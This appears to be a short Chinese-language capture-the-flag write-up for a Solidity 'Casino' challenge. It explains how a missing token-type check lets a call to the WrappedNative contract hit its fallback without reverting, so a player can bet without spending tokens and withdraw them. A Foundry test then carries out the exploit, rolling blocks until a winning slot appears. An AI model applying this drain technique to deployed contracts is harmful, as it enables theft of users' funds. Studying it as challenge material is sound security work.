漏洞点在 `Casino` 的 `_bet` 函数没有对 `token` 的类型进行校验，对 `WrappedNative` 合约调用 `bet` 函数并不会 revert，而是可以进入 `fallback` 正常执行，因此并不会被 catch 捕获。从而在 `play` 时不需要真的消耗代币就可以 `get` 获得 CToken，再调用 `withdraw` 换成 token 提出。最后枚举一个能获得代币的块即可。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Wrapper.sol";
import {Test} from "forge-std/Test.sol";
import {CasinoBase, Casino} from "src/Casino/Casino.sol";

contract CasinoTest is Test {
    CasinoBase public base;
    Casino public casino;
    address public wNative;
    address public you;
    address public owner;

    function setUp() external {
        uint256 startTime = block.timestamp + 60;
        uint256 endTime = startTime + 60;
        uint256 fullScore = 100;

        base = new CasinoBase(startTime, endTime, fullScore);
        you = makeAddr("you");
        wNative = address(base.wNative());
        base.setup();
        casino = base.casino();
    }

    function testExploit() public {
        uint256 blockNum = block.number + 1;
        vm.startPrank(you);

        while (casino.slot() == 0) {
            vm.roll(blockNum++);
        }

        casino.play(wNative, 1_000e18);
        casino.withdraw(wNative, 1_000e18);

        base.solve();
        assertTrue(base.isSolved());
        vm.stopPrank();
    }
}
```

